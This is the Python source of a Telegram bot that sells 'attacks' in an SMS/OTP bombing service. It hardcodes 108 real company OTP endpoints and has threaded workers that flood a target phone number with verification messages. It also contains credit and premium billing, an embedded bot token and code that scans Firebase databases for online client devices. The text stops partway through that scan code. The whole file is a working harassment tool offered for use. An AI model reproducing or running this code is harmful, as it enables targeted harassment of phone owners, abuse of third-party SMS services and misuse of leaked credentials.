#!/usr/bin/env python3
# WARRIOR BOMBER BOT — FINAL FIXED v4
# By Warrior X Technical White Hat

import asyncio, json, os, random, threading, time, datetime, logging, re, sqlite3, string
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import RetryAfter, TelegramError
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, filters, CallbackQueryHandler
)

# ===================== LOGGING =====================
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[logging.FileHandler("bot.log"), logging.StreamHandler()]
)
log = logging.getLogger("bomber")

# ===================== CONFIG =====================
BOT_TOKEN = "8842615934:AAHJwUGHomdRepfUdyAm_i2Wlx3czsNpPts"
OWNER_ID = 8490612097
ADMIN_IDS = [8864524240, 5887312294]

SUPPORT_USERNAME = "@RealZeroXSupport"
SUPPORT_LINK = "https://t.me/RealZeroXSupport"
CHANNEL_USERNAME = "@ExploitLabX"
CHANNEL_LINK = "https://t.me/ExploitLabX"

DEFAULT_COUNTRY_CODE = "91"

# ⚡ VPS-FRIENDLY
THREAD_COUNT = 30
RANDOM_DELAY = 0.02
CUSTOM_DELAY = 0.01
STATUS_UPDATE_INTERVAL = 2
AUTO_REFRESH_SEC = 300
MAX_CONCURRENT_HANDLERS = 50
MAX_GLOBAL_WORKERS = 100

# 🔍 FIREBASE SCAN
SCAN_WORKERS = 50
SCAN_TIMEOUT = 3
MIN_ONLINE_BULK = 10

# 🎯 ATTACKS
FREE_ATTACKS = 2
REFILL_HOURS = 12
REFILL_SECONDS = REFILL_HOURS * 3600

# ===================== SMALL CAPS =====================
SMALL_CAPS = {
    'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ',
    'j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ',
    's':'s','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ',
    'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ',
    'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
    'S':'s','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ',
}

def sc(text):
    return "".join(SMALL_CAPS.get(c, c) for c in str(text))

# ===================== APIs (108) =====================
APIS = [
  {"name": "Agrevolution", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Breeze", "url": "https://api.breeze.in/session/start", "method": "POST", "headers": {"Content-Type": "application/json", "x-device-id": "A1pKVEDhlv66KLtoYsml3", "x-session-id": "MUUdODRfiL8xmwzhEpjN8"}},
  {"name": "Jockey", "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PW Live", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "KPN Fresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3", "method": "POST", "headers": {"x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587", "Content-Type": "application/json; charset=UTF-8"}},
  {"name": "Aditya Birla", "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "GoPaySense", "url": "https://api.gopaysense.com/users/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BankOpen", "url": "https://v2-api.bankopen.co/users/register/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Tata Capital", "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TradeIndia", "url": "https://apis.tradeindia.com/app_login_api/login_app", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Orange Health", "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Jobhai", "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
  {"name": "AstroSage", "url": "https://varta.astrosage.com/sdk/registerAS", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Spinny", "url": "https://api.spinny.com/api/c/user/otp-request/v3/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Dream11", "url": "https://www.dream11.com/auth/passwordless/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "CityMall", "url": "https://citymall.live/api/cl-user/auth/get-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Bella Vita", "url": "https://api.codfirm.in/api/customers/login/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Oyo", "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en", "method": "POST", "headers": {"Content-Type": "text/plain;charset=UTF-8"}},
  {"name": "Myma", "url": "https://portal.myma.in/custom-api/auth/generateotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Freedo", "url": "https://api.freedo.rentals/customer/sendOtpForSignUp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Licious", "url": "https://www.licious.in/api/login/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Bisleri", "url": "https://apis.bisleri.com/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Evital", "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "QuickRide", "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Kwikfix", "url": "https://admin.kwikfixauto.in/api/auth/signupotp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Brevistay", "url": "https://www.brevistay.com/cst/app-api/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Hourly Rooms", "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Pagarbook", "url": "https://api.pagarbook.com/api/v5/auth/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Vahak", "url": "https://api.vahak.in/v1/u/o_w", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Redcliffe", "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Ixigo", "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Testbook", "url": "https://api.testbook.com/api/v2/mobile/signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Medibuddy", "url": "https://loginprod.medibuddy.in/unified-login/user/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Beyoung", "url": "https://www.beyoung.in/api/sendOtp.json", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}},
  {"name": "Wrogn", "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Medkart", "url": "https://app.medkart.in/api/v1/auth/requestOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Coverfox", "url": "https://www.coverfox.com/otp/send/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "GoMechanic", "url": "https://gomechanic.app/api/v2/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lovelocal", "url": "https://homedeliverybackend.mpaani.com/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Udaan", "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Xylem", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NoBroker V1", "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "WoodenStreet", "url": "https://api.woodenstreet.com/api/v1/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Stratzy", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Eka Care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Univest", "url": "https://api.univest.in/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Lifestyle", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "WorkIndia", "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Vyapar", "url": "https://vyaparapp.in/api/ftu/v3/send/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "TooTou", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "ConfirmTkt", "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Nuvama", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Mpokket", "url": "https://api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/signup/status", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Practo", "url": "https://accounts.practo.com/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Ajio", "url": "https://www.ajio.com/api/auth/signupSendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "AltBalaji", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "Grab", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
  {"name": "Delhivery", "url": "https://direct.delhivery.com/delhiverydirect/order/generate-otp", "method": "GET", "headers": {}},
  {"name": "ConfirmTkt Reg", "url": "https://securedapi.confirmtkt.com/api/platform/register", "method": "GET", "headers": {}},
  {"name": "Goibibo", "url": "https://www.goibibo.com/user/voice-otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}},
  {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/4/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}}
]

# ===================== GLOBALS =====================
_user_semaphore = asyncio.Semaphore(MAX_CONCURRENT_HANDLERS)
_global_executor = ThreadPoolExecutor(max_workers=MAX_GLOBAL_WORKERS)
bombing_active = {}
bombing_threads = {}
request_counts = {}
active_bombings_detail = {}
counter_lock = threading.Lock()
_join_cache = {}
_join_lock = threading.Lock()
_fb_failures = {}
_fb_lock = threading.Lock()
firebase_cache = {}
# ===================== DATABASE =====================
DB_PATH = "bomber.db"

def db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30.0, isolation_level=None)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA busy_timeout=30000")
    conn.execute("PRAGMA cache_size=10000")
    return conn

def init_db():
    conn = db(); c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
        free_attacks_used INTEGER DEFAULT 0,
        last_refill_at REAL DEFAULT 0,
        credits INTEGER DEFAULT 0,
        is_premium INTEGER DEFAULT 0,
        premium_type TEXT,
        premium_expires_at REAL DEFAULT 0,
        referrer_id INTEGER, referral_count INTEGER DEFAULT 0,
        joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (user_id INTEGER PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS protected_numbers (
        number TEXT PRIMARY KEY,
        added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        added_by INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS blacklist (number TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS force_channels (id TEXT PRIMARY KEY, label TEXT, url TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS firebases (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE, tag TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS activity_history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, action TEXT, details TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
        code TEXT PRIMARY KEY, credits INTEGER, max_uses INTEGER,
        used_count INTEGER DEFAULT 0, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        created_by INTEGER
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS redeem_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, user_id INTEGER,
        credits INTEGER, used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    defaults = [
        ("random_max_sms", "500"),
        ("custom_max_sms", "100"),
        ("free_attacks", "2"),
        ("refill_hours", "12"),
        ("maintenance", "0"),
    ]
    for k, v in defaults:
        c.execute("INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)", (k, v))
    conn.commit(); conn.close()

init_db()

# ===================== DB HELPERS =====================
def get_config(key, default="0"):
    conn = db(); c = conn.cursor()
    c.execute("SELECT value FROM config WHERE key = ?", (key,))
    r = c.fetchone(); conn.close()
    return r[0] if r else default

def set_config(key, value):
    conn = db(); c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit(); conn.close()

def get_user(uid):
    conn = db(); c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (uid,))
    row = c.fetchone(); conn.close()
    if not row: return None
    keys = ["user_id","username","first_name","free_attacks_used","last_refill_at",
            "credits","is_premium","premium_type","premium_expires_at",
            "referrer_id","referral_count","joined_at"]
    return dict(zip(keys, row))

def create_user(uid, username="", first_name="", referrer_id=None):
    conn = db(); c = conn.cursor()
    c.execute("""INSERT OR IGNORE INTO users 
        (user_id, username, first_name, referrer_id, last_refill_at)
        VALUES (?, ?, ?, ?, ?)""",
        (uid, username, first_name, referrer_id, time.time()))
    conn.commit(); conn.close()

def update_user(uid, **fields):
    if not fields: return
    conn = db(); c = conn.cursor()
    keys = ", ".join(f"{k} = ?" for k in fields)
    values = list(fields.values()) + [uid]
    c.execute(f"UPDATE users SET {keys} WHERE user_id = ?", values)
    conn.commit(); conn.close()

def is_banned(uid):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM banned_users WHERE user_id = ?", (uid,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_protected(num):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM protected_numbers WHERE number = ?", (num,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_blacklisted(num):
    conn = db(); c = conn.cursor()
    c.execute("SELECT 1 FROM blacklist WHERE number = ?", (num,))
    r = c.fetchone(); conn.close()
    return r is not None

def is_admin(uid): return uid in ADMIN_IDS
def is_owner(uid): return uid == OWNER_ID
def has_admin_access(uid): return uid == OWNER_ID or uid in ADMIN_IDS

def log_activity(uid, action, details=""):
    conn = db(); c = conn.cursor()
    c.execute("INSERT INTO activity_history (user_id, action, details) VALUES (?, ?, ?)",
              (uid, action, details))
    conn.commit(); conn.close()

def get_activity(uid, limit=10):
    conn = db(); c = conn.cursor()
    c.execute("SELECT action, details, created_at FROM activity_history WHERE user_id = ? ORDER BY id DESC LIMIT ?",
              (uid, limit))
    rows = c.fetchall(); conn.close()
    return rows

def get_firebases():
    conn = db(); c = conn.cursor()
    c.execute("SELECT url, tag FROM firebases")
    rows = c.fetchall(); conn.close()
    return [{"url": r[0], "tag": r[1]} for r in rows]

def get_force_channels():
    conn = db(); c = conn.cursor()
    c.execute("SELECT id, label, url FROM force_channels")
    rows = c.fetchall(); conn.close()
    return [{"id": r[0], "label": r[1], "url": r[2]} for r in rows]

# ===================== SESSION =====================
_tls = threading.local()

def get_session():
    if not hasattr(_tls, "session"):
        s = requests.Session()
        adapter = HTTPAdapter(pool_connections=30, pool_maxsize=30, max_retries=0, pool_block=False)
        s.mount("http://", adapter); s.mount("https://", adapter)
        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
                          "Accept": "application/json, text/plain, */*"})
        _tls.session = s
    return _tls.session

# ===================== PREMIUM / ATTACKS =====================
def is_premium_active(uid):
    u = get_user(uid)
    if not u: return False
    if not u.get("is_premium"): return False
    exp = u.get("premium_expires_at", 0) or 0
    if exp == 0: return True
    return exp > time.time()

def get_free_attacks_left(uid):
    if has_admin_access(uid): return 999999
    if is_premium_active(uid): return 999999
    u = get_user(uid)
    if not u: return FREE_ATTACKS
    fa_max = int(get_config("free_attacks", "2"))
    return max(0, fa_max - u.get("free_attacks_used", 0))

def check_free_refill(uid):
    u = get_user(uid)
    if not u: return
    if has_admin_access(uid) or is_premium_active(uid): return
    refill_seconds = int(get_config("refill_hours", "12")) * 3600
    now = time.time()
    last = u.get("last_refill_at", 0) or 0
    if last == 0:
        update_user(uid, last_refill_at=now); return
    if now - last >= refill_seconds:
        update_user(uid, free_attacks_used=0, last_refill_at=now)

def get_refill_countdown(uid):
    u = get_user(uid)
    if not u: return "12ʜ 0ᴍ"
    last = u.get("last_refill_at", 0) or 0
    if last == 0: return "12ʜ 0ᴍ"
    refill_seconds = int(get_config("refill_hours", "12")) * 3600
    remaining = max(0, refill_seconds - (time.time() - last))
    h = int(remaining // 3600); m = int((remaining % 3600) // 60)
    return f"{h}ʜ {m}ᴍ"

def deduct_attack_or_credit(uid):
    if has_admin_access(uid) or is_premium_active(uid):
        return (True, "unlimited")
    u = get_user(uid)
    if not u: return (False, "no_user")
    check_free_refill(uid)
    u = get_user(uid)
    fa_max = int(get_config("free_attacks", "2"))
    free_used = u.get("free_attacks_used", 0)
    free_left = max(0, fa_max - free_used)
    credits = u.get("credits", 0)
    if free_left > 0:
        update_user(uid, free_attacks_used=free_used + 1)
        return (True, "free")
    elif credits > 0:
        update_user(uid, credits=credits - 1)
        return (True, "credit")
    else:
        return (False, "no_attacks")

# ===================== RANDOM API =====================
def _build_payload(url, phone, cc):
    u = (url or "").lower()
    if "khatabook" in u: return {"country_code": f"+{cc}", "phone": phone, "app_signature": "Jc/Zu7qNqQ2"}
    if "agrevolution" in u: return {"mobile_number": phone, "client_id": "kisan-app"}
    if "penpencil" in u or "xylem" in u: return {"mobile": phone, "organizationId": "5eb393ee95fab7468a79d189"}
    if "nuvama" in u: return {"contactInfo": phone, "mode": "SMS"}
    if "jockey" in u: return {"mobile": phone, "country_code": f"+{cc}"}
    if "breeze" in u:
        return {"phoneNumber": phone, "authVerificationType": "otp",
                "device": {"id": "A1pKVEDhlv66KLtoYsml3", "platform": "Chrome", "type": "Desktop"},
                "countryCode": f"+{cc}"}
    return {"phone": phone, "mobile": phone, "phoneNumber": phone, "mobileNumber": phone,
            "contactNumber": phone, "country_code": cc, "countryCode": cc}

def call_api(api, phone, cc="91"):
    try:
        url = api["url"]; method = api.get("method", "POST").upper()
        headers = dict(api.get("headers", {}))
        payload = _build_payload(url, phone, cc)
        s = get_session(); ct = headers.get("Content-Type", "").lower()
        if method == "GET":
            r = s.get(url, headers=headers, params=payload, timeout=4)
        elif "json" in ct:
            r = s.post(url, headers=headers, json=payload, timeout=4)
        else:
            r = s.post(url, headers=headers, data=payload, timeout=4)
        return r.status_code in (200, 201, 202, 204)
    except Exception:
        return False

def random_otp_worker(uid, target, cc="91"):
    avail = list(range(len(APIS)))
    while bombing_active.get(uid):
        if not avail: avail = list(range(len(APIS)))
        idx = random.choice(avail)
        ok = call_api(APIS[idx], target, cc)
        with counter_lock:
            request_counts[uid] = request_counts.get(uid, 0) + 1
        if uid in active_bombings_detail:
            active_bombings_detail[uid]["requests"] = request_counts.get(uid, 0)
        if not ok and idx in avail: avail.remove(idx)
        time.sleep(RANDOM_DELAY)

# ===================== FIREBASE STATS (multiple structures) =====================
def is_fb_alive(tag):
    with _fb_lock:
        f, t = _fb_failures.get(tag, (0, 0))
        if f >= 5 and time.time() - t < 300: return False
        return True

def mark_fb_failure(tag):
    with _fb_lock:
        f, _ = _fb_failures.get(tag, (0, 0))
        _fb_failures[tag] = (f + 1, time.time())

def mark_fb_success(tag):
    with _fb_lock:
        _fb_failures.pop(tag, None)

def fetch_firebase_stats(url):
    """Fetch stats from a Firebase URL"""
    try:
        r = get_session().get(f"{url.rstrip('/')}/clients.json", timeout=5)
        if r.status_code != 200: return None
        data = r.json()
        if not data or not isinstance(data, dict):
            return {"online": 0, "offline": 0, "total": 0}
        on = off = 0
        for d, i in data.items():
            if not isinstance(i, dict):
                off += 1; continue
            if _is_device_online(i):
                on += 1
            else:
                off += 1
        return {"online": on, "offline": off, "total": on + off}
    except Exception:
        return None

def _is_device_online(dev_info):
    """Check if a device is online (multiple structures)"""
    if not isinstance(dev_info, dict): return False
    if dev_info.get("status") is True: return True
    if dev_info.get("online") is True: return True
    if dev_info.get("isOnline") is True: return True
    if dev_info.get("connected") is True: return True
    last = dev_info.get("last_seen") or dev_info.get("lastSeen") or dev_info.get("last_active")
    if last:
        try:
            ts = int(str(last).replace(".", ""))
            if ts > 10**12: ts = ts // 1000
            if time.time() - ts < 300: return True
        except Exception: pass
    return False

def scan_one_firebase(fb):
    """Scan single Firebase — return online device IDs"""
    fb_url = fb["url"].rstrip("/")
    try:
        r = get_session().get(f"{fb_url}/clients.json", timeout=SCAN_TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            if data and isinstance(data, dict):
                online = [d for d, i in data.items() if _is_device_online(i)]
                mark_fb_success(fb["tag"])
                return {
                    "tag": fb["tag"], "url": fb_url,
                    "online": online, "offline": len(data) - len(online),
                    "alive": True,
                }
    except Exception:
        pass
    mark_fb_failure(fb["tag"])
    return {"tag": fb["tag"], "url": fb_url, "online": [], "offline": 0, "alive": False}

def scan_all_firebases_fast():
    """Scan ALL firebases in parallel — 50 workers"""
    firebases = get_firebases()
    if not firebases:
        return {"total_online": 0, "total_offline": 0, "online_devices": {}}
    results = []
